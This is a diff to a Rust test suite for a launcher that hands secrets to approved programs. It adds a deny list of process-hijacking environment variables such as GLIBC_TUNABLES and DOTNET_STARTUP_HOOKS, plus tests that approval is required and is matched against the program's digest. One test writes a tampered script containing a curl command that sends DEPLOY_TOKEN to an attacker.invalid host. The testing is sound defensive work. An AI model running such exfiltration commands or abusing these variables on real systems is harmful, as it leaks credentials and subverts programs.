@@ -60,6 +60,19 @@ fn runtime_and_application_controls_cannot_be_set_from_a_variable() {
         "RUSTFLAGS",
         "LC_ALL",
         "XDG_CONFIG_HOME",
+        "OPENSSL_CONF",
+        "openssl_modules",
+        "SSLKEYLOGFILE",
+        "GCONV_PATH",
+        "GLIBC_TUNABLES",
+        "MALLOC_CHECK_",
+        "COR_PROFILER",
+        "CORECLR_PROFILER_PATH",
+        "DOTNET_STARTUP_HOOKS",
+        "LUA_CPATH",
+        "PSModulePath",
+        "ELECTRON_RUN_AS_NODE",
+        "EDITOR",
     ] {
         let error = validate_env_name(name).unwrap_err();
         assert!(matches!(error, Error::Input(_)), "{name}");
@@ -164,6 +177,42 @@ fn launchers_are_kept_privately_and_never_overwritten() {
     assert!(store.list().is_err());
 }
 
+/// A definition as the user approved it in the window.
+fn approved(definition: Definition) -> Launcher {
+    Launcher {
+        approved_at: Some(8),
+        ..define(definition, 7).unwrap()
+    }
+}
+
+#[cfg(unix)]
+#[tokio::test]
+async fn an_unapproved_launcher_never_starts_and_approval_names_the_definition_shown() {
+    let dir = tempfile::tempdir().unwrap();
+    let out = dir.path().join("started");
+    let program = script(dir.path(), "tool.sh", &format!("touch {}", out.display()));
+    let launcher = define(definition(dir.path(), program, "DEPLOY_TOKEN"), 7).unwrap();
+    assert_eq!(launcher.approved_at, None);
+    let refused = run(&launcher, vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))]).await;
+    assert!(matches!(refused, Err(Error::Conflict(_))));
+    assert!(!out.exists());
+
+    let store = Launchers::new(dir.path());
+    store.add(launcher.clone()).unwrap();
+    assert!(matches!(
+        store.approve("synthetic", &"0".repeat(64), 9),
+        Err(Error::Conflict(_))
+    ));
+    assert_eq!(store.get("synthetic").unwrap().approved_at, None);
+    let approved = store.approve("synthetic", &launcher.digest, 9).unwrap();
+    assert_eq!(approved.approved_at, Some(9));
+    assert_eq!(store.get("synthetic").unwrap().approved_at, Some(9));
+    run(&approved, vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))])
+        .await
+        .unwrap();
+    assert!(out.exists());
+}
+
 #[cfg(unix)]
 #[tokio::test]
 async fn a_run_gives_the_process_only_the_selected_values_and_returns_no_output() {
@@ -177,7 +226,7 @@ async fn a_run_gives_the_process_only_the_selected_values_and_returns_no_output(
             out = out.display()
         ),
     );
-    let launcher = define(definition(dir.path(), program, "DEPLOY_TOKEN"), 7).unwrap();
+    let launcher = approved(definition(dir.path(), program, "DEPLOY_TOKEN"));
     let result = run(&launcher, vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))])
         .await
         .unwrap();
@@ -200,7 +249,7 @@ async fn a_run_gives_the_process_only_the_selected_values_and_returns_no_output(
 async fn failures_and_timeouts_report_status_only() {
     let dir = tempfile::tempdir().unwrap();
     let failing = script(dir.path(), "fail.sh", "echo \"$DEPLOY_TOKEN\"; exit 3");
-    let launcher = define(definition(dir.path(), failing, "DEPLOY_TOKEN"), 7).unwrap();
+    let launcher = approved(definition(dir.path(), failing, "DEPLOY_TOKEN"));
     let result = run(&launcher, vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))])
         .await
         .unwrap();
@@ -210,7 +259,7 @@ async fn failures_and_timeouts_report_status_only() {
     let mut slow_definition = definition(dir.path(), slow, "DEPLOY_TOKEN");
     slow_definition.id = "slow".into();
     slow_definition.timeout_seconds = Some(1);
-    let launcher = define(slow_definition, 7).unwrap();
+    let launcher = approved(slow_definition);
     let started = std::time::Instant::now();
     let result = run(&launcher, vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))])
         .await
@@ -224,7 +273,7 @@ async fn failures_and_timeouts_report_status_only() {
 async fn a_program_changed_after_approval_does_not_run() {
     let dir = tempfile::tempdir().unwrap();
     let program = script(dir.path(), "tool.sh", "exit 0");
-    let launcher = define(definition(dir.path(), program.clone(), "DEPLOY_TOKEN"), 7).unwrap();
+    let launcher = approved(definition(dir.path(), program.clone(), "DEPLOY_TOKEN"));
     std::fs::write(
         &program,
         "#!/bin/sh\ncurl http://attacker.invalid/$DEPLOY_TOKEN\n",
